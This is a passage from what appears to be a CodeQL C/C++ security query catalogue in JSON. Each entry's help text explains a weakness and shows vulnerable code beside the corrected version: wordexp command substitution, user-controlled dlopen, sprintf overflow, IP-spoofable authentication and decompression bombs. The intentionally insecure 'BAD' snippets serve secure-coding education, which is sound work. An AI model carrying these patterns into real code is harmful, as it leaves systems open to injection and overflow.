[CWE-191](https://cwe.mitre.org/data/definitions/191.html).\n"
  },
  "cpp/wordexp-injection": {
    "name": "Uncontrolled data used in `wordexp` command",
    "description": "Using user-supplied data in a `wordexp` command, without disabling command substitution, can make code vulnerable to command injection.",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "cpp/wordexp-injection",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-078"
    ],
    "filename": "ff0b76af-WordexpTainted",
    "language": "cpp",
    "help": "# Uncontrolled data used in `wordexp` command\nThe code passes user input to `wordexp`. This leaves the code vulnerable to attack by command injection, because `wordexp` performs command substitution. Command substitution is a feature that replaces `$(command)` or ``` `command` ``` with the output of the given command, allowing the user to run arbitrary code on the system.\n\n\n## Recommendation\nWhen calling `wordexp`, pass the `WRDE_NOCMD` flag to prevent command substitution.\n\n\n## Example\nThe following example passes a user-supplied file path to `wordexp` in two ways. The first way uses `wordexp` with no specified flags. As such, it is vulnerable to command injection. The second way uses `wordexp` with the `WRDE_NOCMD` flag. As such, no command substitution is performed, making this safe from command injection.\n\n\n```c\n\nint main(int argc, char** argv) {\n  char *filePath = argv[2];\n\n  {\n    // BAD: the user-controlled string is injected\n    // directly into `wordexp` which performs command substitution\n\n    wordexp_t we;\n    wordexp(filePath, &we, 0);\n  }\n\n  {\n    // GOOD: command substitution is disabled\n\n    wordexp_t we;\n    wordexp(filePath, &we, WRDE_NOCMD);\n  }\n}\n\n```\n\n## References\n* CERT C Coding Standard: [STR02-C. Sanitize data passed to complex subsystems](https://www.securecoding.cert.org/confluence/display/c/STR02-C.+Sanitize+data+passed+to+complex+subsystems).\n* OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n"
  },
  "cpp/data-decompression-bomb": {
    "name": "User-controlled file decompression",
    "description": "User-controlled data that flows into decompression library APIs without checking the compression rate is dangerous",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "low",
    "id": "cpp/data-decompression-bomb",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-409"
    ],
    "filename": "4c28f3d5-DecompressionBombs",
    "language": "cpp",
    "help": "# User-controlled file decompression\nExtracting Compressed files with any compression algorithm like gzip can cause denial of service attacks.\n\nAttackers can compress a huge file consisting of repeated similiar bytes into a small compressed file.\n\n\n## Recommendation\nWhen you want to decompress a user-provided compressed file you must be careful about the decompression ratio or read these files within a loop byte by byte to be able to manage the decompressed size in each cycle of the loop.\n\n\n## Example\nReading an uncompressed Gzip file within a loop and check for a threshold size in each cycle.\n\n\n```cpp\n#include \"zlib.h\"\n\nvoid SafeGzread(gzFile inFileZ) {\n    const int MAX_READ = 1024 * 1024 * 4;\n    const int BUFFER_SIZE = 8192;\n    unsigned char unzipBuffer[BUFFER_SIZE];\n    unsigned int unzippedBytes;\n    unsigned int totalRead = 0;\n    while (true) {\n        unzippedBytes = gzread(inFileZ, unzipBuffer, BUFFER_SIZE);\n        totalRead += unzippedBytes;\n        if (unzippedBytes <= 0) {\n            break;\n        }\n\n        if (totalRead > MAX_READ) {\n            // Possible decompression bomb, stop processing.\n            break;\n        } else {\n            // process buffer\n        }\n    }\n}\n\n```\nThe following example is unsafe, as we do not check the uncompressed size.\n\n\n```cpp\n#include \"zlib.h\"\n\nvoid UnsafeGzread(gzFile inFileZ) {\n    const int BUFFER_SIZE = 8192;\n    unsigned char unzipBuffer[BUFFER_SIZE];\n    unsigned int unzippedBytes;\n    while (true) {\n        unzippedBytes = gzread(inFileZ, unzipBuffer, BUFFER_SIZE);\n        if (unzippedBytes <= 0) {\n            break;\n        }\n\n        // process buffer\n    }\n}\n\n```\n\n## References\n* [Zlib documentation](https://zlib.net/manual.html)\n* [An explanation of the attack](https://www.bamsoftware.com/hacks/zipbomb/)\n* Common Weakness Enumeration: [CWE-409](https://cwe.mitre.org/data/definitions/409.html).\n"
  },
  "cpp/conditionally-uninitialized-variable": {
    "name": "Conditionally uninitialized variable",
    "description": "An initialization function is used to initialize a local variable, but the returned status code is not checked. The variable may be left in an uninitialized state, and reading the variable may result in undefined behavior.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "id": "cpp/conditionally-uninitialized-variable",
    "tags": [
      "security",
      "external/cwe/cwe-457"
    ],
    "filename": "11d2cd49-ConditionallyUninitializedVariable",
    "language": "cpp",
    "help": "# Conditionally uninitialized variable\nA common pattern is to initialize a local variable by calling another function (an \"initialization\" function) with the address of the local variable as a pointer argument. That function is then responsible for writing to the memory location referenced by the pointer.\n\nIn some cases, the called function may not always write to the memory pointed to by the pointer argument. In such cases, the function will typically return a \"status\" code, informing the caller as to whether the initialization succeeded or not. If the caller does not check the status code before reading the local variable, it may read unitialized memory, which can result in unexpected behavior.\n\n\n## Recommendation\nWhen using a initialization function that does not guarantee to initialize the memory pointed to by the passed pointer, and returns a status code to indicate whether such initialization occurred, the status code should be checked before reading from the local variable.\n\n\n## Example\nIn this hypothetical example we have code for managing a series of devices. The code includes a `DeviceConfig` struct that can represent properties about each device. The `initDeviceConfig` function can be called to initialize one of these structures, by providing a \"device number\", which can be used to look up the appropriate properties in some data store. If an invalid device number is provided, the function returns a status code of `-1`, and does not initialize the provided pointer.\n\nIn the first code sample below, the `notify` function calls the `initDeviceConfig` function with a pointer to the local variable `config`, which is then subsequently accessed to fetch properties of the device. However, the code does not check the return value from the function call to `initDeviceConfig`. If the device number passed to the `notify` function was invalid, the `initDeviceConfig` function will leave the `config` variable uninitialized, which will result in the `notify` function accessing uninitialized memory.\n\n\n```c\nstruct DeviceConfig {\n  bool isEnabled;\n  int channel;\n};\n\nint initDeviceConfig(DeviceConfig *ref, int deviceNumber) {\n  if (deviceNumber >= getMaxDevices()) {\n    // No device with that number, return -1 to indicate failure\n    return -1;\n  }\n  // Device with that number, fetch parameters and initialize struct\n  ref->isEnabled = fetchIsDeviceEnabled(deviceNumber);\n  ref->channel = fetchDeviceChannel(deviceNumber);\n  // Return 0 to indicate success\n  return 0;\n}\n\nint notify(int deviceNumber) {\n  DeviceConfig config;\n  initDeviceConfig(&config, deviceNumber);\n  // BAD: Using config without checking the status code that is returned\n  if (config.isEnabled) {\n    notifyChannel(config.channel);\n  }\n}\n\n```\nTo fix this, the code needs to check that the return value of the call to `initDeviceConfig` is zero. If that is true, then the calling code can safely assume that the local variable has been initialized.\n\n\n```c\nstruct DeviceConfig {\n  bool isEnabled;\n  int channel;\n};\n\nint initDeviceConfig(DeviceConfig *ref, int deviceNumber) {\n  if (deviceNumber >= getMaxDevices()) {\n    // No device with that number, return -1 to indicate failure\n    return -1;\n  }\n  // Device with that number, fetch parameters and initialize struct\n  ref->isEnabled = fetchIsDeviceEnabled(deviceNumber);\n  ref->channel = fetchDeviceChannel(deviceNumber);\n  // Return 0 to indicate success\n  return 0;\n}\n\nvoid notify(int deviceNumber) {\n  DeviceConfig config;\n  int statusCode = initDeviceConfig(&config, deviceNumber);\n  if (statusCode == 0) {\n    // GOOD: Status code returned by initialization function is checked, so this is safe\n    if (config.isEnabled) {\n      notifyChannel(config.channel);\n    }\n  }\n}\n\n```\n\n## References\n* Wikipedia: [Uninitialized variable](https://en.wikipedia.org/wiki/Uninitialized_variable).\n* Common Weakness Enumeration: [CWE-457](https://cwe.mitre.org/data/definitions/457.html).\n"
  },
  "cpp/user-controlled-bypass": {
    "name": "Authentication bypass by spoofing",
    "description": "Authentication by checking that the peer's address matches a known IP or web address is unsafe as it is vulnerable to spoofing attacks.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 8.1,
    "precision": "medium",
    "id": "cpp/user-controlled-bypass",
    "tags": [
      "security",
      "external/cwe/cwe-290"
    ],
    "filename": "7deffc97-AuthenticationBypass",
    "language": "cpp",
    "help": "# Authentication bypass by spoofing\nCode which relies on an IP address or domain name for authentication can be exploited by an attacker who spoofs their address.\n\n\n## Recommendation\nIP address verification can be a useful part of an authentication scheme, but it should not be the single factor required for authentication. Make sure that other authentication methods are also in place.\n\n\n## Example\nIn this example (taken from [CWE-290: Authentication Bypass by Spoofing](http://cwe.mitre.org/data/definitions/290.html)), the client is authenticated by checking that its IP address is `127.0.0.1`. An attacker might be able to bypass this authentication by spoofing their IP address.\n\n\n```cpp\n\n#define BUFFER_SIZE (4 * 1024)\n\nvoid receiveData()\n{\n  int sock;\n  sockaddr_in addr, addr_from;\n  char buffer[BUFFER_SIZE];\n  int msg_size;\n  socklen_t addr_from_len;\n\n  // configure addr\n  memset(&addr, 0, sizeof(addr));\n  addr.sin_family = AF_INET;\n  addr.sin_port = htons(1234);\n  addr.sin_addr.s_addr = INADDR_ANY;\n\n  // create and bind the socket\n  sock = socket(AF_INET, SOCK_DGRAM, 0);\n  bind(sock, (sockaddr *)&addr, sizeof(addr));\n\n  // receive message\n  addr_from_len = sizeof(addr_from);\n  msg_size = recvfrom(sock, buffer, BUFFER_SIZE, 0, (sockaddr *)&addr_from, &addr_from_len);\n\n  // BAD: the address is controllable by the user, so it\n  // could be spoofed to bypass the security check below.\n  if ((msg_size > 0) && (strcmp(\"127.0.0.1\", inet_ntoa(addr_from.sin_addr)) == 0))\n  {\n    // ...\n  }\n}\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-290](https://cwe.mitre.org/data/definitions/290.html).\n"
  },
  "cpp/unterminated-variadic-call": {
    "name": "Unterminated variadic call",
    "description": "Calling a variadic function without a sentinel value may result in a buffer overflow if the function expects a specific value to terminate the argument list.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 8.8,
    "precision": "medium",
    "id": "cpp/unterminated-variadic-call",
    "tags": [
      "reliability",
      "security",
      "external/cwe/cwe-121"
    ],
    "filename": "246fe9a8-UnterminatedVarargsCall",
    "language": "cpp",
    "help": "# Unterminated variadic call\nThe program calls a function that expects the variable argument list to be terminated with a sentinel value (typically NULL, 0 or -1). In this case, the sentinel value has been omitted as a final argument. This defect may result in incorrect behavior of the function and unintended stack memory access, leading to incorrect program results, instability, and even vulnerability to buffer overflow style attacks.\n\n\n## Recommendation\nEach description of a defect highlighted by this rule includes a suggested value for the terminator. Check that this value is correct, then add it to the end of the call.\n\n\n## Example\n\n```cpp\n#include <stdarg.h>\n\nvoid pushStrings(char *firstString, ...)\n{\n\tva_list args;\n\tchar *arg;\n\n\tva_start(args, firstString);\n\n\t// process inputs, beginning with firstString, ending when NULL is reached\n\targ = firstString;\n\twhile (arg != NULL)\n\t{\n\t\t// push the string\n\t\tpushString(arg);\n\t\n\t\t// move on to the next input\n\t\targ = va_arg(args, char *);\n\t}\n\n\tva_end(args);\n}\n\nvoid badFunction()\n{\n\tpushStrings(\"hello\", \"world\", NULL); // OK\n\t\n\tpushStrings(\"apple\", \"pear\", \"banana\", NULL); // OK\n\n\tpushStrings(\"car\", \"bus\", \"train\"); // BAD, not terminated with the expected NULL\n}\n```\nIn this example, the third call to `pushStrings` is not correctly terminated. This call should be updated to include `NULL` as the fourth and final argument to this call.\n\n\n## References\n* Common Weakness Enumeration: [CWE-121](https://cwe.mitre.org/data/definitions/121.html).\n"
  },
  "cpp/incorrect-allocation-error-handling": {
    "name": "Incorrect allocation-error handling",
    "description": "Mixing up the failure conditions of 'operator new' and 'operator new(std::nothrow)' can result in unexpected behavior.",
    "kind": "problem",
    "id": "cpp/incorrect-allocation-error-handling",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "medium",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-570",
      "external/cwe/cwe-252",
      "external/cwe/cwe-755"
    ],
    "filename": "e7508833-IncorrectAllocationErrorHandling",
    "language": "cpp",
    "help": "# Incorrect allocation-error handling\nDifferent overloads of the `new` operator handle allocation failures in different ways. If `new T` fails for some type `T`, it throws a `std::bad_alloc` exception, but `new(std::nothrow) T` returns a null pointer. If the programmer does not use the corresponding method of error handling, allocation failure may go unhandled and could cause the program to behave in unexpected ways.\n\n\n## Recommendation\nMake sure that exceptions are handled appropriately if `new T` is used. On the other hand, make sure to handle the possibility of null pointers if `new(std::nothrow) T` is used.\n\n\n## Example\n\n```cpp\n// BAD: the allocation will throw an unhandled exception\n// instead of returning a null pointer.\nvoid bad1(std::size_t length) noexcept {\n  int* dest = new int[length];\n  if(!dest) {\n    return;\n  }\n  std::memset(dest, 0, length);\n  // ...\n}\n\n// BAD: the allocation won't throw an exception, but\n// instead return a null pointer.\nvoid bad2(std::size_t length) noexcept {\n  try {\n    int* dest = new(std::nothrow) int[length];\n    std::memset(dest, 0, length);\n    // ...\n  } catch(std::bad_alloc&) {\n    // ...\n  }\n}\n\n// GOOD: the allocation failure is handled appropriately.\nvoid good1(std::size_t length) noexcept {\n  try {\n    int* dest = new int[length];\n    std::memset(dest, 0, length);\n    // ...\n  } catch(std::bad_alloc&) {\n    // ...\n  }\n}\n\n// GOOD: the allocation failure is handled appropriately.\nvoid good2(std::size_t length) noexcept {\n  int* dest = new(std::nothrow) int[length];\n  if(!dest) {\n    return;\n  }\n  std::memset(dest, 0, length);\n  // ...\n}\n\n```\n\n## References\n* CERT C++ Coding Standard: [MEM52-CPP. Detect and handle memory allocation errors](https://wiki.sei.cmu.edu/confluence/display/cplusplus/MEM52-CPP.+Detect+and+handle+memory+allocation+errors).\n* Common Weakness Enumeration: [CWE-570](https://cwe.mitre.org/data/definitions/570.html).\n* Common Weakness Enumeration: [CWE-252](https://cwe.mitre.org/data/definitions/252.html).\n* Common Weakness Enumeration: [CWE-755](https://cwe.mitre.org/data/definitions/755.html).\n"
  },
  "cpp/overrunning-write": {
    "name": "Potentially overrunning write",
    "description": "Buffer write operations that do not control the length of data written may overflow.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 9.3,
    "precision": "medium",
    "id": "cpp/overrunning-write",
    "tags": [
      "reliability",
      "security",
      "external/cwe/cwe-120",
      "external/cwe/cwe-787",
      "external/cwe/cwe-805"
    ],
    "filename": "43f650fa-OverrunWrite",
    "language": "cpp",
    "help": "# Potentially overrunning write\nThe program performs a buffer copy or write operation with no upper limit on the size of the copy, and it appears that certain inputs will cause a buffer overflow to occur in this case. In addition to causing program instability, techniques exist which may allow an attacker to use this vulnerability to execute arbitrary code.\n\n\n## Recommendation\nAlways control the length of buffer copy and buffer write operations. `strncpy` should be used over `strcpy`, `snprintf` over `sprintf`, and in other cases 'n-variant' functions should be preferred.\n\n\n## Example\n\n```c\nvoid sayHello(uint32_t userId)\n{\n\tchar buffer[18];\n\n\t// BAD: this message overflows the buffer if userId >= 10000\n\tsprintf(buffer, \"Hello, user %d!\", userId);\n\n\tMessageBox(hWnd, buffer, \"New Message\", MB_OK);\n}\n```\nIn this example, the call to `sprintf` writes a message of 14 characters (including the terminating null) plus the length of the string conversion of \\`userId\\` into a buffer with space for just 18 characters. As such, if \\`userId\\` is greater or equal to \\`10000\\`, the last characters overflow the buffer resulting in undefined behavior.\n\nTo fix this issue these changes should be made:\n\n* Control the size of the buffer by declaring it with a compile time constant.\n* Preferably, replace the call to `sprintf` with `snprintf`, using the defined constant size of the buffer or \\`sizeof(buffer)\\` as maximum length to write. This will prevent the buffer overflow.\n* Optionally, if \\`userId\\` is expected to be less than \\`10000\\`, then return or throw an error if \\`userId\\` is out of bounds.\n* Otherwise, consider increasing the buffer size to at least 25 characters, so that the message is displayed correctly regardless of the value of \\`userId\\`.\n\n## References\n* CERT C Coding Standard: [STR31-C. Guarantee that storage for strings has sufficient space for character data and the null terminator](https://www.securecoding.cert.org/confluence/display/c/STR31-C.+Guarantee+that+storage+for+strings+has+sufficient+space+for+character+data+and+the+null+terminator).\n* CERT C++ Coding Standard: [STR50-CPP. Guarantee that storage for strings has sufficient space for character data and the null terminator](https://www.securecoding.cert.org/confluence/display/cplusplus/STR50-CPP.+Guarantee+that+storage+for+strings+has+sufficient+space+for+character+data+and+the+null+terminator).\n* Common Weakness Enumeration: [CWE-120](https://cwe.mitre.org/data/definitions/120.html).\n* Common Weakness Enumeration: [CWE-787](https://cwe.mitre.org/data/definitions/787.html).\n* Common Weakness Enumeration: [CWE-805](https://cwe.mitre.org/data/definitions/805.html).\n"
  },
  "cpp/uncontrolled-process-operation": {
    "name": "Uncontrolled process operation",
    "description": "Using externally controlled strings in a process operation can allow an attacker to execute malicious commands.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 8.2,
    "precision": "medium",
    "id": "cpp/uncontrolled-process-operation",
    "tags": [
      "security",
      "external/cwe/cwe-114"
    ],
    "filename": "1f2675c0-UncontrolledProcessOperation",
    "language": "cpp",
    "help": "# Uncontrolled process operation\nThe code passes user input directly to `system`, `dlopen`, `LoadLibrary` or some other process or library routine. As a result, the user can cause execution of arbitrary code.\n\n\n## Recommendation\nIf possible, use hard-coded string literals for the command to run or library to load. Instead of passing the user input directly to the process or library function, examine the user input and then choose among hard-coded string literals.\n\nIf the applicable libraries or commands cannot be determined at compile time, then add code to verify that the user-input string is safe before using it.\n\n\n## Example\n\n```c\nint main(int argc, char** argv) {\n  char *lib = argv[2];\n  \n  // BAD: the user can cause arbitrary code to be loaded\n  void* handle = dlopen(lib, RTLD_LAZY);\n  \n  // GOOD: only hard-coded libraries can be loaded\n  void* handle2;\n\n  if (!strcmp(lib, \"inmem\")) {\n    handle2 = dlopen(\"/usr/share/dbwrap/inmem\", RTLD_LAZY);\n  } else if (!strcmp(lib, \"mysql\")) {\n    handle2 = dlopen(\"/usr/share/dbwrap/mysql\", RTLD_LAZY);\n  } else {\n    die(\"Invalid library specified\\n\");\n  }\n}\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-114](https://cwe.mitre.org/data/definitions/114.html).\n"
  },
  "cpp/twice-locked": {
    "name": "Mutex locked twice",
    "description": "Calling the lock method of a mutex twice in succession might cause a deadlock.",
    "kind": "problem",
    "id": "cpp/twice-locked",
    "problem.severity": "error",
    "security-severity": 5.0,
    "precision": "low",
    "tags": [
      "security",
      "external/cwe/cwe-764",
      "external/cwe/cwe-833"
    ],
    "filename": "aeb98138-TwiceLocked",
    "language": "cpp",
    "help": "# Mutex locked twice\nMutexes come in two flavors: recursive and non-recursive. For example, the C++ mutex library provides both `std::mutex` and `std::recursive_mutex`. A non-recursive mutex cannot be locked until it has been unlocked by its previous owner, even if it is already owned by the current thread. Deadlock is often caused by a thread attempting to lock the same mutex twice, usually in a recursive algorithm.\n\n\n## Recommendation\nIf a recursive method needs to acquire a lock, then split it into two methods. The first method is public and is responsible for locking and unlocking the mutex. It delegates the rest of the work to a second private method. The second method does not need to lock or unlock the mutex because that is done by the first method.\n\n\n## Example\nIn this example, the method `f` is recursive, so it causes a deadlock by attempting to lock the mutex twice.\n\n\n```cpp\nclass C {\n  std::mutex mutex;\npublic:\n  // BAD: recursion causes deadlock.\n  int f(int n) {\n    mutex.lock();\n    int result = (n == 0) ? 1 : n*f(n-1);\n    mutex.unlock();\n    return result;\n  }\n};\n\n```\nIn this second example, the recursion is delegated to an internal method so the mutex is only locked once.\n\n\n```cpp\nclass C {\n  std::mutex mutex;\n  int f_impl(int n) {\n    return (n == 0) ? 1 : n*f_impl(n-1);\n  }\npublic:\n  // GOOD: recursion is delegated to f_impl.\n  int f(int n) {\n    mutex.lock();\n    int result = f_impl(n);\n    mutex.unlock();\n    return result;\n  }\n};\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-764](https://cwe.mitre.org/data/definitions/764.html).\n* Common Weakness Enumeration: [CWE-833](https://cwe.mitre.org/data/definitions/833.html).\n"
  },
  "cpp/dangerous-use-of-ssl-shutdown": {
    "name": "Dangerous use SSL_shutdown.",
    "description": "Incorrect closing of the connection leads to the creation of different states for the server and client, which can be exploited by an attacker.",
    "kind": "problem",
    "id": "cpp/dangerous-use-of-ssl-shutdown",
    "problem.severity": "warning",
    "precision": "medium",
    "tags": [
      "correctness",
      "security",
      "experimental",
      "external/cwe/cwe-670"
    ],
    "filename": "2aa503dd-DangerousUseSSL_shutdown",
    "language": "cpp",
    "help": "# Dangerous use SSL_shutdown.\nIncorrect closing of the connection leads to the creation of different states for the server and client, which can be exploited by an attacker.\n\n\n## Example\nThe following example shows the incorrect and correct usage of function SSL_shutdown.\n\n\n```cpp\n...\nSSL_shutdown(ssl); \nSSL_shutdown(ssl); // BAD\n...\n    switch ((ret = SSL_shutdown(ssl))) {\n    case 1:\n      break;\n    case 0:\n      ERR_clear_error();\n      if (-1 != (ret = SSL_shutdown(ssl))) break; // GOOD\n...\n\n```\n\n## References\n* CERT Coding Standard: [EXP12-C. Do not ignore values returned by functions - SEI CERT C Coding Standard - Confluence](https://wiki.sei.cmu.edu/confluence/display/c/EXP12-C.+Do+not+ignore+values+returned+by+functions).\n* Openssl.org: [SSL_shutdown - shut down a TLS/SSL connection](https://www.openssl.org/docs/man3.0/man3/SSL_shutdown.html).\n* Common Weakness Enumeration: [CWE-670](https://cwe.mitre.org/data/definitions/670.html).\n"
  },
  "cpp/incorrect-string-type-conversion": {
    "name": "Cast from char* to wchar_t*",
    "description": "Casting a byte string to a wide-character string is likely to yield a string that is incorrectly terminated or aligned. This can lead to undefined behavior, including buffer overruns.",
    "kind": "problem",
    "id": "cpp/incorrect-string-type-conversion",
    "problem.severity": "error",
    "security-severity": 8.8,
    "precision": "high",
    "tags": [
      "security",
      "external/cwe/cwe-704"
    ],
    "filename": "3e1e16e0-WcharCharConversion",
    "language": "cpp",
    "help": "# Cast from char* to wchar_t*\nThis rule indicates a potentially incorrect cast from an byte string (`char *`) to a wide-character string (`wchar_t *`).\n\nThis cast might yield strings that are not correctly terminated; including potential buffer overruns when using such strings with some dangerous APIs.\n\n\n## Recommendation\nDo not explicitly cast byte strings to wide-character strings.\n\nFor string literals, prepend the literal string with the letter \"L\" to indicate that the string is a wide-character string (`wchar_t *`).\n\nFor converting a byte literal to a wide-character string literal, you would need to use the appropriate conversion function for the platform you are using. Please see the references section for options according to your platform.\n\n\n## Example\nIn the following example, an byte string literal (`\"a\"`) is cast to a wide-character string.\n\n\n```cpp\nwchar_t* pSrc;\n\npSrc = (wchar_t*)\"a\"; // casting a byte-string literal \"a\" to a wide-character string\n```\nTo fix this issue, prepend the literal with the letter \"L\" (`L\"a\"`) to define it as a wide-character string.\n\n\n## References\n* General resources: [std::mbstowcs](https://en.cppreference.com/w/cpp/string/multibyte/mbstowcs)\n* Microsoft specific resources: [Security Considerations: International Features](https://docs.microsoft.com/en-us/windows/desktop/Intl/security-considerations--international-features)\n* Common Weakness Enumeration: [CWE-704](https://cwe.mitre.org/data/definitions/704.html).\n"
  },
  "cpp/improper-check-return-value-scanf": {
    "name": "Improper check of return value of scanf",
    "description": "Not checking the return value of scanf and related functions may lead to undefined behavior.",
    "kind": "problem",
    "id": "cpp/improper-check-return-value-scanf",
    "problem.severity": "warning",
    "precision": "medium",
    "tags": [
      "correctness",
      "security",
      "experimental",
      "external/cwe/cwe-754",
      "external/cwe/cwe-908"
    ],
    "filename": "971f7384-ImproperCheckReturnValueScanf",
    "language": "cpp",
    "help": "# Improper check of return value of scanf\nThe \\`scanf\\` family functions does not require the memory pointed to by its additional pointer arguments to be initialized before calling. The user is required to check the return value of \\`scanf\\` and similar functions to establish how many of the additional arguments were assigned values. Not checking the return value and reading one of the arguments not assigned a value is undefined behavior and may have unexpected consequences.\n\n\n## Recommendation\nThe user should check the return value of \\`scanf\\` and related functions and check that any additional argument was assigned a value before reading the additional argument.\n\n\n## Example\nThe first example below is correct, as value of \\`i\\` is only read once it is checked that \\`scanf\\` has read one item. The second example is incorrect, as the return value of \\`scanf\\` is not checked, and as \\`scanf\\` might have failed to read any item before returning.\n\n\n```cpp\n...\n  r = scanf(\"%i\", &i);\n  if (r == 1) // GOOD\n    return i;\n  else\n    return -1;\n...\n  scanf(\"%i\", &i); // BAD\n  return i;\n...\n\n```\n\n## References\n* CERT C Coding Standard: [EXP12-C. Do not ignore values returned by functions](https://wiki.sei.cmu.edu/confluence/display/c/EXP12-C.+Do+not+ignore+values+returned+by+functions).\n* Common Weakness Enumeration: [CWE-754](https://cwe.mitre.org/data/definitions/754.html).\n* Common Weakness Enumeration: [CWE-908](https://cwe.mitre.org/data/definitions/908.html).\n"
  },
  "cpp/count-untrusted-data-external-api": {
    "name": "Frequency counts for external APIs that are used with untrusted data",
    "description": "This reports the external APIs that are used with untrusted data, along with how frequently the API is called, and how many unique sources of untrusted data flow to it.",
    "id": "cpp/count-untrusted-data-external-api",
    "kind": "table",
    "tags": [
      "security external/cwe/cwe-20"
    ],
    "filename": "ce4f8673-CountUntrustedDataToExternalAPI",
    "language": "cpp",
    "help": "# Frequency counts for external APIs that are used with untrusted data\nUsing unsanitized untrusted data in an external API can cause a variety of security issues. This query reports all external APIs that are used with untrusted data, along with how frequently the API is used, and how many unique sources of untrusted data flow to this API. This query is designed primarily to help identify which APIs may be relevant for security analysis of this application.\n\nAn external API is defined as a call to a function that is not defined in the source code, and is not modeled as a taint step in the default taint library. External APIs may be from the C++ standard library, third party dependencies or from internal dependencies. The query will report the function name, along with either `[param x]`, where `x` indicates the position of the parameter receiving the untrusted data or `[qualifier]` indicating the untrusted data is used as the qualifier to the function call.\n\n\n## Recommendation\nFor each result:\n\n* If the result highlights a known sink, no action is required.\n* If the result highlights an unknown sink for a problem, then add modeling for the sink to the relevant query.\n* If the result represents a call to an external API which transfers taint, add the appropriate modeling, and re-run the query to determine what new results have appeared due to this additional modeling.\nOtherwise, the result is likely uninteresting. Custom versions of this query can extend the `SafeExternalAPIFunction` class to exclude known safe external APIs from future analysis.\n\n\n## Example\nIf the query were to return the API `fputs [param 1]` then we should first consider whether this a security relevant sink. In this case, this is writing to a `FILE*`, so we should consider whether this is an XSS sink. If it is, we should confirm that it is handled by the XSS query.\n\nIf the query were to return the API `strcat [param 1]`, then this should be reviewed as a possible taint step, because tainted data would flow from the 1st argument to the 0th argument of the call.\n\nNote that both examples are correctly handled by the standard taint tracking library and XSS query.\n\n\n## References\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "cpp/infinite-loop-with-unsatisfiable-exit-condition": {
    "name": "Infinite loop with unsatisfiable exit condition",
    "description": "A loop with an unsatisfiable exit condition could prevent the program from terminating, making it vulnerable to a denial of service attack.",
    "kind": "problem",
    "id": "cpp/infinite-loop-with-unsatisfiable-exit-condition",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "tags": [
      "security",
      "external/cwe/cwe-835"
    ],
    "filename": "5e1c02b4-InfiniteLoopWithUnsatisfiableExitCondition",
    "language": "cpp",
    "help": "# Infinite loop with unsatisfiable exit condition\nLoops can contain multiple exit conditions, either directly in the loop condition or as guards around `break` or `return` statements. If none of the exit conditions can ever be satisfied, then the loop will never terminate. A program containing an infinite loop could be vulnerable to a denial of service attack if it is possible for an attacker to trigger the loop.\n\n\n## Recommendation\nWhen writing a loop that is intended to terminate, make sure that all the necessary exit conditions can be satisfied and that loop termination is clear.\n\n\n## Example\nThe following example shows an infinite loop. The value of variable `i` is always zero, so the condition guarding the `break` is always false.\n\n\n```c\nvoid test(int n) {\n  int i = 0;\n  if (n <= 0) {\n    return;\n  }\n  while (1) {\n    // BAD: condition is never true, so loop will not terminate.\n    if (i == n) {\n      break;\n    }\n  }\n}\n\n```\nThe error has been fixed below by incrementing `i` in the body of the loop.\n\n\n```c\nvoid test(int n) {\n  int i = 0;\n  if (n <= 0) {\n    return;\n  }\n  while (1) {\n    // GOOD: condition is true after n iterations.\n    if (i == n) {\n      break;\n    }\n    i++;\n  }\n}\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-835](https://cwe.mitre.org/data/definitions/835.html).\n"
  },
  "cpp/wrong-use-of-the-umask": {
    "name": "Find the wrong use of the umask function.",
    "description": "Incorrectly evaluated argument to the umask function may have security implications.",
    "kind": "problem",
    "id": "cpp/wrong-use-of-the-umask",
    "problem.severity": "warning",
    "precision": "medium",
    "tags": [
      "correctness",
      "maintainability",
      "security",
      "experimental",
      "external/cwe/cwe-266",
      "external/cwe/cwe-264",
      "external/cwe/cwe-200",
      "external/cwe/cwe-560",
      "external/cwe/cwe-687"
    ],
    "filename": "53e17c80-IncorrectPrivilegeAssignment",
    "language": "cpp",
    "help": "# Find the wrong use of the umask function.\nFinding for function calls that set file permissions that may have errors in use. Incorrect arithmetic for calculating the resolution mask, using the same mask in opposite functions, using a mask that is too wide.\n\n\n## Example\nThe following example demonstrates erroneous and fixed ways to use functions.\n\n\n```cpp\n...\n  umask(0); // BAD\n...\n  maskOut = S_IRWXG | S_IRWXO;\n  umask(maskOut); // GOOD\n  ...\n  fchmod(fileno(fp), 0555 - maskOut); // BAD \n  ...\n  fchmod(fileno(fp), 0555 & ~maskOut); // GOOD\n...\n  umask(0666);\n  chmod(pathname, 0666); // BAD\n...\n  umask(0022);\n  chmod(pathname, 0666); // GOOD\n...\n\n```\n\n## References\n* CERT C Coding Standard: [FIO06-C. Create files with appropriate access permissions](https://wiki.sei.cmu.edu/confluence/display/c/FIO06-C.+Create+files+with+appropriate+access+permissions).\n* Common Weakness Enumeration: [CWE-266](https://cwe.mitre.org/data/definitions/266.html).\n* Common Weakness Enumeration: [CWE-264](https://cwe.mitre.org/data/definitions/264.html).\n* Common Weakness Enumeration: [CWE-200](https://cwe.mitre.org/data/definitions/200.html).\n* Common Weakness Enumeration: [CWE-560](https://cwe.mitre.org/data/definitions/560.html).\n* Common Weakness Enumeration: [CWE-687](https://cwe.mitre.org/data/definitions/687.html).\n"
  },
  "cpp/insufficient-key-size": {
    "name": "Use of a cryptographic algorithm with insufficient key size",
    "description": "Using cryptographic algorithms with too small a key size can allow an attacker to compromise security.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
